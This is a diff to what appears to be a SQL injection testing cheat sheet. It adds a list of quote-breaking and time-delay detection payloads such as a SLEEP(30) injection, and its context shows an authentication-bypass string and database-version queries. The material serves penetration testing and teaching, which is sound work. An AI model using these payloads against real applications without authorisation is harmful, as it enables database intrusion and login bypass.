@@ -37,6 +37,19 @@ Here are some quick methods to detect the SQL Injection vulnerability, though th
   2. Submit SQL specific query.
   3. Submit Boolean conditions such as or 1=1 and or 1=0, and looking application's response.
   4. Submit certain payloads that results in time delay.
+Payloads:
+'
+)'
+"
+`
+')
+")
+`)
+'))
+"))
+`))
+'-SLEEP(30); #
+
 ```
 
 # Authentication Bypass
@@ -96,11 +109,9 @@ user' or 1=1 LIMIT 0,1;#
   (Using NULL maximizes the probability that the payload will succeed. NULL can be converted to every commonly used data type.)
 ```
 * To go for the methods in more detail, go through portswigger site.
-  
-  https://portswigger.net/web-security/sql-injection/union-attacks
+    https://portswigger.net/web-security/sql-injection/union-attacks
 
 ## 3. Extracting basic information like database(), version(), user(), UUID() with concat() or group_concat()
-
 ### 1. Database version
 ```
     Oracle 			  SELECT banner FROM v$version
